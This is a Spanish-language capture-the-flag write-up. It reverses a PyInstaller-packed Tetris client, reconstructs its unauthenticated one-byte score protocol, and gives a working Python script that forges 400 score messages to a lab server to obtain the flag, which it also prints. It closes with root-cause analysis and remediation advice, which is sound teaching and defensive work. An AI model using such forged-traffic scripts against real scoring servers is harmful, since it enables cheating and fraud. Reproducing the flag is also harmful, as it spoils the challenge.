# Tetris — Reversing de Desktop App + Lógica de Negocio

**Categoría:** Reversing (desktop app) / Lógica de negocio
**Plataforma:** SoftwareSeguro HackLab
**Flag:** `5c829c1139319b1b3da72d805c6c669b`
**Autor del writeup:** adonaissh

## Descripción del desafío

> Ganá 40000 puntos al tetris. Solo eso.

Se entrega un binario Linux (`client`) que es, directamente, un juego de Tetris
jugable. No hay código fuente, no hay API documentada, no hay pistas sobre
cómo se reporta el puntaje. El objetivo es llegar a 40.000 puntos — un número
que, jugando de forma legítima, implicaría muchísimas horas (o directamente
no sería viable en un tiempo razonable).

## Análisis inicial del binario

```bash
chmod +x ./client
file ./client
```

```
./client: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically
linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0,
BuildID[sha1]=f5e4eb9bd95f0a14f41d1ef1a6f8ee703c85a059, stripped
```

Un ELF normal, sin simbolos (stripped). Antes de pensar en desensamblar
assembly x86-64 a mano, conviene revisar si hay strings reveladores:

```bash
strings ./client | grep -iE "http|socket|score|puntaje|flag|md5|server|\.com|\.ar" | head -50
```

El resultado mostró referencias a `pyi-python-flag`, `LOADER:`,
`python3.10/lib-dynload/_md5...` y `_socket...`. Eso es una firma clarísima
de **PyInstaller**: un ejecutable que empaqueta un interprete de Python
completo junto con el bytecode compilado de la aplicación, para que corra
como un binario "nativo" sin depender de que el sistema tenga Python
instalado. En otras palabras: no hay que desensamblar x86-64, hay que
extraer y leer **bytecode de Python**.

## Extracción del bundle de PyInstaller

Se usó [`pyinstxtractor`](https://github.com/extremecoders-re/pyinstxtractor):

```bash
mkdir -p ~/tetris_extract && cd ~/tetris_extract
curl -L -o pyinstxtractor.py \
  https://raw.githubusercontent.com/extremecoders-re/pyinstxtractor/master/pyinstxtractor.py
cp /mnt/d/hacklab/client .
python3 pyinstxtractor.py client
```

Primer intento, con el Python del sistema (no 3.10): extrajo 186 archivos del
`CArchive` pero avisó que la versión de Python no coincidía con la que
empaquetó el ejecutable, y **saltó por completo la extracción del `.pyz`**
(el archivo que contiene todos los módulos comprimidos, incluyendo el código
propio del juego). Sin la versión exacta de Python, el extractor no puede
desempaquetar correctamente el `.pyz`.

Para solucionarlo, se instaló Python 3.10 específicamente (vía el PPA de
deadsnakes, porque Ubuntu no lo trae en sus repos por defecto):

```bash
sudo add-apt-repository ppa:deadsnakes/ppa -y
sudo apt update
sudo apt install -y python3.10 python3.10-venv python3.10-dev
```

Y se repitió la extracción, esta vez con la versión correcta:

```bash
rm -rf client_extracted
python3.10 pyinstxtractor.py client
```

```
[+] Found 219 files in PYZ archive
[+] Successfully extracted pyinstaller archive: client
```

Esta vez sí se extrajo todo, incluyendo `client_extracted/client.pyc` — el
módulo principal del juego, confirmado como bytecode de **CPython 3.10**:

```bash
file client_extracted/client.pyc
```

```
client_extracted/client.pyc: Byte-compiled Python module for CPython 3.10
(magic: 3439)
```

## Intentos de decompilación

### `decompyle3`

```bash
pip3 install decompyle3 --break-system-packages
decompyle3 client_extracted/client.pyc
```

```
Unsupported Python version, 3.10, for decompilation
```

`decompyle3` no soporta bytecode de Python 3.10. Descartado.

### `pycdc`

Se clonó y compiló [`pycdc`](https://github.com/zrax/pycdc), un decompilador
en C++ con soporte más amplio de versiones:

```bash
git clone https://github.com/zrax/pycdc.git
cd pycdc
cmake . && make -j4
```

```bash
./pycdc ~/tetris_extract/client_extracted/client.pyc > client_decompiled.py
```

Esto funcionó parcialmente: reconstruyó correctamente todo el módulo (los
imports, las constantes del juego, los diccionarios de las piezas
`TETROMINOES`, y el esqueleto completo de la clase `NetClient`), pero se
cortó en seco en medio del método `connect`:

```
Unsupported opcode: JUMP_IF_NOT_EXC_MATCH (210)
    pass
# WARNING: Decompyle incomplete
```

Se intentó primero pensando que era un problema de la extracción con
versión incorrecta de Python, pero al re-extraer con `python3.10` (la
versión correcta) el error fue exactamente el mismo. Conclusión: es una
limitación propia del decompilador de `pycdc` con ese opcode específico
(usado en el manejo de excepciones `try/except` de Python 3.10), no un
problema de la extracción.

### `pycdas` — la salida que sí funcionó completa

El mismo proyecto `pycdc` incluye `pycdas`, un **desensamblador** (no
decompilador): en vez de intentar reconstruir sintaxis Python, lista las
instrucciones de bytecode crudas de cada "code object". Como no intenta
reconstruir estructuras de control complejas, no se traba con el opcode
problemático:

```bash
./pycdas ~/tetris_extract/client_extracted/client.pyc > client_disasm.txt
wc -l client_disasm.txt   # 4688 líneas, archivo completo, sin cortes
```

Cada función/método queda delimitado por una línea `Object Name: <nombre>`,
lo que permite armar un índice del archivo:

```bash
grep -n "Object Name:" client_disasm.txt
```

Esto listó todas las funciones y clases del juego: `make_grid`, `can_move`,
`merge_piece`, `clear_lines`, `rotate`, `draw_grid`, `draw_piece`, `main`, y
la clase que interesaba de verdad: **`NetClient`**, con los métodos
`__init__`, `connect`, `close`, `_rate_limit_before_send`, `_send_loop`,
`_recv_loop` y `send_score`.

## Reconstrucción del protocolo de red

Leyendo el bytecode disassemblado método por método (`sed -n '<rango>p'
client_disasm.txt`), se reconstruyó el protocolo completo que usa el cliente
para reportar el puntaje al servidor.

### Constantes relevantes (del decompilado parcial de `pycdc`)

```python
SERVER_DOMAIN = 'tetris-server.shared.softwareseguro.com.ar'
SERVER_PORT = 15452
NAME_BYTES = 30
MAX_SEND_PER_SEC = 4
MD5_RE = re.compile(b'\b[a-fA-F0-9]{32}\b')
```

### 1. Handshake de conexión (`NetClient.connect`)

Al conectar, el cliente abre un socket TCP y manda **un único mensaje
inicial**: el nombre del jugador, codificado en UTF-8, truncado o rellenado
con bytes nulos hasta ocupar **exactamente 30 bytes**:

```python
s = socket.create_connection((host, port), timeout=4)
s.settimeout(0.5)
name_bytes = player_name.encode('utf-8')[:NAME_BYTES].ljust(NAME_BYTES, b'\x00')
s.sendall(name_bytes)
```

Después de eso, lanza dos threads daemon: uno para mandar (`_send_loop`) y
otro para recibir (`_recv_loop`).

No hay ningún otro paso de autenticación, token, ni validación. El servidor
confía ciegamente en el nombre que el cliente le manda.

### 2. Cómo se reporta cada línea (en `main`)

Cada vez que se completa una línea en el juego:

```python
for _ in range(cleared):
    score += 100
    if net:
        net.send_score(100)
```

El puntaje **local** (`score`) se incrementa en 100, y se llama a
`send_score(100)`. Es decir: **nunca se manda el puntaje total**, solo se
manda el *delta* de cada evento.

### 3. `send_score(value)` — encolado

```python
def send_score(self, value):
    """Encola un valor de 0..100 para enviar como un byte."""
    if value < 0:
        value = 0
    # (hay un chequeo de value > 100 en el bytecode, pero es un NOP:
    #  no hace nada — no clampea el límite superior)
    self.send_q.put(value)
```

El valor pasa a una cola (`Queue`). El chequeo de límite superior existe en
el bytecode pero es un bloque muerto (solo un `NOP`) — no se usa en la
práctica porque el único caller (`main`) siempre manda exactamente `100`,
pero confirma que la validación de rango está rota del lado del cliente (sin
que esto importe para el exploit).

### 4. `_send_loop` — el envío real, un byte por vez

```python
def _send_loop(self):
    while not self.stop.is_set():
        try:
            val = self.send_q.get(timeout=0.1)
        except Empty:
            continue
        while val > 100:
            self._rate_limit_before_send()
            self.sock.sendall(bytes([100]))
            self.sent_times.append(time.monotonic())
            val -= 100
        if val != 0:
            self._rate_limit_before_send()
            self.sock.sendall(bytes([val]))
            self.sent_times.append(time.monotonic())
```

Acá está la clave de todo: **cada incremento de puntaje se manda como un
único byte crudo** sobre el socket TCP, cuyo valor numérico (0-100) es
directamente el incremento de puntos. No hay ningún framing, ningún JSON,
ningún checksum, ninguna firma. El servidor simplemente lee bytes del socket
y los suma a algún contador interno asociado al nombre de jugador.

`_rate_limit_before_send` usa `self.sent_times` (una cola de los últimos 16
timestamps de envío) para frenar el envío y no superar
`MAX_SEND_PER_SEC = 4` — pero esto es una limitación **puramente del lado
cliente**, autoimpuesta por el propio juego para no saturar la red. Nada
obliga a que quien hable con el servidor respete ese límite.

### 5. `_recv_loop` — cómo llega la flag

```python
def _recv_loop(self):
    buf = bytearray()
    while not self.stop.is_set() and self.sock:
        try:
            data = self.sock.recv(1024)
        except socket.timeout:
            continue
        except OSError:
            self.disconnected = True
            self.disconnect_reason = 'io_error'
            break
        if not data:
            self.disconnected = True
            self.disconnect_reason = 'peer_closed'
            break
        buf.extend(data)
        if b'GANASTE' in buf:
            self.win_msg = True
            m = MD5_RE.search(buf)
            if m:
                self.win_md5 = m.group(0).decode('ascii')
        self.last_server_text = buf.decode('utf-8', errors='replace')[-200:]
        if len(buf) > 4096:
            buf[:-2048] = b''
```

El servidor manda, en algún momento, un mensaje de texto que contiene el
string `GANASTE` seguido del MD5 de la flag (detectado con la regex
`MD5_RE` sobre lo que haya llegado por el socket). No hay un pedido
explícito del cliente para "pedir" ese mensaje — el servidor lo manda por su
cuenta apenas detecta, del lado suyo, que el jugador llegó al objetivo.

## El exploit

Con el protocolo completo reconstruido, la conclusión es directa: **no hace
falta jugar al Tetris en absoluto**. Alcanza con:

1. Conectarse por TCP al servidor.
2. Mandar el nombre de jugador (30 bytes, rellenado con `\x00`).
3. Mandar bytes de valor `100`, tantas veces como haga falta, hasta sumar
   40.000 (es decir, 400 bytes).
4. Escuchar la respuesta y extraer el MD5.

```python
import socket
import time
import re
import threading

HOST = 'tetris-server.shared.softwareseguro.com.ar'
PORT = 15452
NAME_BYTES = 30
PLAYER_NAME = 'hacklab'

MD5_RE = re.compile(rb'\b[a-fA-F0-9]{32}\b')

def connect():
    s = socket.create_connection((HOST, PORT), timeout=10)
    name_bytes = PLAYER_NAME.encode('utf-8')[:NAME_BYTES].ljust(NAME_BYTES, b'\x00')
    s.sendall(name_bytes)
    return s

s = connect()
total = 0
buf = bytearray()
stop_recv = threading.Event()

def recv_loop():
    s.settimeout(0.5)
    while not stop_recv.is_set():
        try:
            data = s.recv(4096)
            if not data:
                print("El servidor cerró la conexión (recv vacío).")
                break
            buf.extend(data)
            print("Recibido:", data)
            if b'GANASTE' in buf:
                m = MD5_RE.search(buf)
                if m:
                    print("\nFLAG (MD5) encontrada:", m.group().decode())
                stop_recv.set()
        except socket.timeout:
            continue
        except OSError as e:
            print(f"Error en recv_loop: {e}")
            break

t = threading.Thread(target=recv_loop, daemon=True)
t.start()

while total < 40000 and not stop_recv.is_set():
    try:
        s.sendall(bytes([100]))
        total += 100
        print(f"Enviado +100 -> total acumulado: {total}")
        time.sleep(0.3)
    except (ConnectionAbortedError, ConnectionResetError, BrokenPipeError, OSError) as e:
        print(f"Conexión caída en total={total} ({e}). Reconectando...")
        time.sleep(1)
        s = connect()

print("Esperando unos segundos más por si llega la respuesta...")
time.sleep(5)
stop_recv.set()
t.join(timeout=2)

if b'GANASTE' not in buf:
    print("\nNo llegó GANASTE. Buffer completo:", buf)
```

### Primeros intentos: desconexiones inesperadas

La primera versión del script mandaba los bytes con un delay fijo de
`0.05s` entre cada uno (sin lógica de reconexión). Esa versión se cortaba
siempre con el mismo error:

```
ConnectionAbortedError: [WinError 10053] Se ha anulado una conexión
establecida por el software en su equipo host
```

En la primera corrida se cortó a los 700 puntos (7 envíos), y en una
segunda corrida —con el mismo delay— llegó hasta 3200 puntos antes de
cortarse. Esto descartaba que fuera un límite fijo de *cantidad* de
mensajes por conexión en ese momento, pero al agregar lógica de
reconexión automática y reintentar, se observó un patrón mucho más
consistente: **la conexión se cae exactamente cada 3200 puntos (32 envíos
de 100), en las 12 reconexiones necesarias para llegar a 40.000**, de
forma perfectamente regular.

Esto indica que hay algún mecanismo (del lado del servidor, o de algún
proxy/balanceador en el medio) que cierra la conexión después de un número
fijo de mensajes recibidos — probablemente pensado como una mitigación
anti-abuso parcial. Sin embargo, **ese mecanismo no resetea el puntaje
acumulado**: el servidor evidentemente lleva la cuenta del puntaje
asociada al **nombre de jugador**, no al socket TCP individual, porque al
reconectarse con el mismo nombre, el conteo siguió donde había quedado.
Esa es la razón por la que la lógica de reconexión automática (en el
script final) resolvió el problema sin perder progreso.

### Resultado final

```
...
Enviado +100 -> total acumulado: 39900
Enviado +100 -> total acumulado: 40000
Listo, esperando respuesta del servidor...
Recibido: b'GANASTE 5c829c1139319b1b3da72d805c6c669b'

FLAG (MD5) encontrada: 5c829c1139319b1b3da72d805c6c669b
```

**Flag:** `5c829c1139319b1b3da72d805c6c669b`

## Causa raíz

El diseño del protocolo de puntaje tiene dos fallas de fondo:

1. **El cliente es la única fuente de verdad sobre qué eventos de juego
   ocurrieron.** El servidor no tiene ninguna forma de verificar que un
   byte recibido corresponda realmente a una línea despejada en una
   partida real: solo confía en que, si llegó un byte con valor `100` por
   el socket, es porque el jugador legítimamente limpió una línea. No hay
   ningún estado de partida del lado del servidor (semilla del tablero,
   secuencia de piezas, timestamps de jugadas) contra el cual validar los
   eventos recibidos.
2. **El protocolo de red es trivialmente replicable sin el cliente real.**
   Al ser bytes crudos sin firma, sin sesión autenticada más allá de un
   nombre de texto libre, y sin ningún desafío cripto que solo el binario
   original pueda resolver, cualquiera que invierta el binario (o incluso
   solo capture el tráfico con Wireshark) puede hablar el protocolo
   directamente, sin pasar por la lógica del juego en absoluto.

En otras palabras: toda la "lógica de negocio" que determina si un jugador
ganó (llegar a 40.000 puntos) vive enteramente del lado del servidor y es
correcta en sí misma — el problema es que los **insumos** que recibe (los
eventos de puntaje) no tienen ninguna garantía de integridad ni de origen.

## Recomendaciones de remediación

1. **El servidor nunca debe confiar en el puntaje reportado por el
   cliente sin poder derivarlo de forma independiente.** Una solución
   robusta es que el servidor sea quien genere la semilla del juego
   (secuencia de piezas) y simule la partida en base a las *acciones* del
   jugador (mover, rotar, caer), calculando el puntaje él mismo —
   nunca aceptando un "+100" como dato de entrada confiable.
2. **Autenticar la sesión de juego**, no solo el nombre del jugador: un
   token de sesión único por partida (emitido por el servidor al empezar),
   que se deba incluir en cada mensaje, dificulta (aunque no elimina) la
   posibilidad de fabricar tráfico sin pasar por una partida real iniciada
   legítimamente.
3. **Agregar límites de sanity-check del lado servidor**: por ejemplo,
   rechazar o marcar como sospechoso un ritmo de incrementos de puntaje
   imposible de lograr jugando (p. ej., 400 líneas despejadas en menos de
   un minuto, cuando el juego real tiene un límite físico de piezas por
   segundo).
4. **No basar ninguna medida anti-abuso únicamente en cortar la conexión
   cada N mensajes.** Como se observó en este desafío, cortar la conexión
   cada 3200 puntos no evitó nada: el atacante simplemente reconecta y
   sigue, porque el contador de puntaje vive del lado del servidor
   asociado al nombre de jugador, no a la conexión. Cualquier control
   anti-abuso debe operar sobre el dato que realmente importa (el puntaje
   acumulado y su tasa de crecimiento), no sobre un proxy indirecto como
   la duración de la conexión TCP.
5. **Minimizar la información expuesta en binarios distribuidos al
   cliente.** El dominio y puerto del servidor, el protocolo completo de
   comunicación, y hasta la lógica para detectar el mensaje de victoria
   (`MD5_RE`) estaban disponibles en texto plano dentro del bytecode
   Python empaquetado, sin ningún tipo de ofuscación. Si bien ofuscar no
   es una solución real a la causa raíz (la validación del lado servidor
   lo es), reduce la superficie de ataque para quien no tenga el nivel de
   esfuerzo para reversar el protocolo desde cero.